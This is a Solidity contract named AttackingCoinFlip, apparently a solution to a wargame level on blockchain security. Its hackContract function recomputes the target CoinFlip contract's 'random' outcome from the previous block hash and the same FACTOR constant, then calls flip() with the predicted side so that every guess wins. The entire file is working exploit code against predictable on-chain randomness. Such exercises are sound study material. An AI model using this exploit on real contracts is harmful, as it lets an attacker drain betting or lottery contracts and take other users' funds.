// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./CoinFlip.sol";

contract AttackingCoinFlip {
    address public contractAddress;
    uint256 private lastHash;
    CoinFlip public coinflip;
    uint256 private constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _contractAddress) {
        coinflip = CoinFlip(_contractAddress);
    }

    function hackContract() external {

        uint256 blockHash = uint256(blockhash(block.number - 1));
        lastHash = blockHash;
        uint256 coinFlip = blockHash / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        coinflip.flip(side);   
        }
}
